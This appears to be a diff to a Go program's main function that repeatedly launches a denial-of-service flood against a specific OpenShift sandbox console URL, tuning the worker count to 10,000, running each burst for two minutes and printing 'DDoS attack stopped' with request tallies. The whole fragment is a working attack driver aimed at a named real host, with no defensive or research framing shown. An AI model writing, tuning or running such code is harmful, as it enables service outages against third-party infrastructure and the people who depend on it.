@@ -21,13 +21,14 @@ func main() {
 
 	for {
 	        fmt.Println("helloooo")
-	        workers := 100000
+	        workers := 10000
 		d, err := New("https://console-openshift-console.apps.sandbox-m2.ll9k.p1.openshiftapps.com", workers)
 		if err != nil {
 			panic(err)
 		}
 		d.Run()
-		time.Sleep(time.Second)
+		time.Sleep(time.Minute * 2)
+		d.Stop()
 		successRequest, amountRequests := d.Result()
 		fmt.Println("DDoS attack stopped:", successRequest, amountRequests)
 	}
